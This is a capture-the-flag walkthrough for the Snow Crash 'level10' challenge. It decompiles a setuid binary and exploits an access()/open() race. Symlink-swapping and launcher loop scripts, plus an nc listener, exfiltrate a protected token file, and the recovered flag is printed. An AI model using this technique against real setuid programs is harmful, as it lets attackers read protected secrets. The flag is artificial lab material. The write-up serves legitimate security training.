# level10

## Steps

1. __Action__ (Guest): list the files present at the root
	```sh
	ls -A
	```

2. __Observation__ (Guest): the previous command reveals two files of
	interest, `level10` and `token`
	```
	.bash_logout  .bashrc  level10  .profile  token
	```

3. __Action__ (Guest): gather information on those files
	```sh
	getfacl level10 token
	```

4. __Observation__ (Guest): the previous command reveals that
	the `level10` file:
	- is owned by the `flag10` user
	- is readable by the `level10` user
	- is executable by the `level10` user
	- has the `setuid` bit enabled

	and the `token` file:
	- is owned by the `flag10` user
	- is readable only by the `flag10` user
	```
	# file: level10
	# owner: flag10
	# group: level10
	# flags: ss-
	user::rwx
	group::---
	group:level10:r-x
	group:flag10:r-x
	mask::r-x
	other::r-x

	# file: token
	# owner: flag10
	# group: flag10
	user::rw-
	group::---
	other::---
	```

5. __Action__ (Host): copy the `level10` file on the host machine to decompile
	it using [dogbolt](https://dogbolt.org/)
	```sh
	sshpass -f snow-crash/level09/flag \
	scp -P 4242 level10@192.168.56.101:/home/user/level10/level10 .
	docker cp snow-crash:level10 .
	```

6. __Observation__ (Host): the RetDec decompiler reveals that the
	`level10` file takes two arguments, a `file` and a `host`
	- a check on the `file` is done using `access`, if the user has access to 
	the file
	- a connection is attempted on the port `6969`
	- a banner message is sent (`.*( )*.\n`)
	- the file is opened, its contents read and sent to the connected host
	```c
	// ------------------------ Functions -------------------------

	// From module:   /home/user/level10/level10.c
	// Address range: 0x80486d4 - 0x804896c
	// Line range:    11 - 73
	int main(int argc, char ** argv) {
		int32_t v1 = __readgsdword(20); // 0x80486e7
		if (argc <= 2) {
			// 0x80486fc
			printf("%s file host\n\tsends file to host if you have access"
			" to it\n", *argv);
			exit(1);
			// UNREACHABLE
		}
		int32_t v2 = (int32_t)argv; // 0x804871f
		char * path = (char *)*(int32_t *)(v2 + 4); // 0x8048726
		int32_t chars_printed; // 0x80486d4
		if (access(path, R_OK) != 0) {
			// 0x8048940
			chars_printed = printf("You don't have access to %s\n", path);
		} else {
			char * cp = (char *)*(int32_t *)(v2 + 8); // 0x8048731
			printf("Connecting to %s:6969 .. ", cp);
			fflush((struct _IO_FILE *)g1);
			// 0x804878f
			int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
			int32_t addr = 2; // bp-36, 0x80487ba
			inet_addr(cp);
			htons(0x1b39);
			if (connect(sock_fd, (struct sockaddr *)&addr, 16) == -1) {
				// 0x804880f
				printf("Unable to connect to host %s\n", cp);
				exit(1);
				// UNREACHABLE
			}
			// 0x8048830
			if (write(sock_fd, (int32_t *)".*( )*.\n", 8) == -1) {
				// 0x8048851
				printf("Unable to write banner to host %s\n", cp);
				exit(1);
				// UNREACHABLE
			}
			// 0x8048872
			printf("Connected!\nSending file .. ");
			fflush((struct _IO_FILE *)g1);
			int32_t fd = open(path, O_RDONLY); // 0x804889b
			if (fd == -1) {
				// 0x80488ab
				puts("Damn. Unable to open file");
				exit(1);
				// UNREACHABLE
			}
			// 0x80488c3
			int32_t buf; // bp-4132, 0x80486d4
			int32_t nbyte = read(fd, &buf, 0x1000); // 0x80488da
			if (nbyte == -1) {
				// 0x80488ea
				printf("Unable to read from file: %s\n",
				strerror(*__errno_location()));
				exit(1);
				// UNREACHABLE
			}
			// 0x8048916
			write(sock_fd, &buf, nbyte);
			chars_printed = puts("wrote file!");
		}
		int32_t result = chars_printed; // 0x8048963
		if (v1 != __readgsdword(20)) {
			// 0x8048965
			__stack_chk_fail();
			result = &g2;
		}
		// 0x804896a
		return result;
	}
	```
	It looks like we have to exploit the `access` command, here's what
	the man says
	```
	Warning: Using access() to check if a user is authorized to, for example,
	open a file before actually doing so using open(2) creates a security hole,
	because the user might exploit the short time interval between checking and
	opening the file to manipulate it.
	```
7. __Action__ (Guest): exploit the vulnerability of the `access` command
	(step 1)
	The first step consists of continuously cresting a symbolic lin between
	a file we have the rights to and the `token` file.
	In order to do so, we need a bash script that continuously creates a
	symbolic link between the `token` file and our file.
	```sh
	#!/bin/bash

	while true; do
		touch /tmp/file     # maybe remove
		rm -rf /tmp/file    # maybe remove
		ln -s /home/user/level10/token /tmp/file
		rm -rf /tmp/file
	done
	```
8. __Action__ (Guest): exploit the vulnerability of the `access` commmand
	(step 2)
	The second step consists of continuously launching the `level10` program
	with the file we have access to and our IP address passed as parameters.
	In order to do so, we need a bash script that continously launches
	the program with our file and our IP address as parameters.
	```sh
	#!/bin/bash

	while true; do
		/home/user/level10/level10 /tmp/file 192.168.56.101
	done
	```
9. __Action__ (Guest): exploit the vulnerability of the `access` command
	(step 3)
	Once the two scripts are launched, we need to open a third terminal to
	listen on the port `6969` and collect the flag
	```sh
	nc -lk 6969
	```

10. __Observation__ (Guest): the password is displayed on stdout
	```
	.*( )*.
	.*( )*.
	.*( )*.
	woupa2yuojeeaaed06riuj63c
	.*( )*.
	.*( )*.
	.*( )*.
	```
